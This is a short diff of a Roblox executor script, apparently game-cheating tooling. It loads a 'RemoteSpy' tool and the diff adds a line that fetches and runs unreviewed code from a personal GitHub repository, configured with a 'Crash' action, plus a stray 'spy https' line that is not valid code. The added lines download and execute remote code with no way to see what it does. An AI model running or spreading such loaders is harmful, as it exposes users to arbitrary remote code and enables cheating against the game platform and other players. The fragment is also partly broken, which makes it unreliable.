@@ -1,1 +1,6 @@
 loadstring(game:HttpGetAsync("https://github.com/richie0866/remote-spy/releases/latest/download/RemoteSpy.lua"))()
+
+spy https
+
+getgenv().Action = "Crash" -- Available Action: "Rejoin", "Crash"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jianlobiano/Triple-T/refs/heads/main/Spy%3F"))()
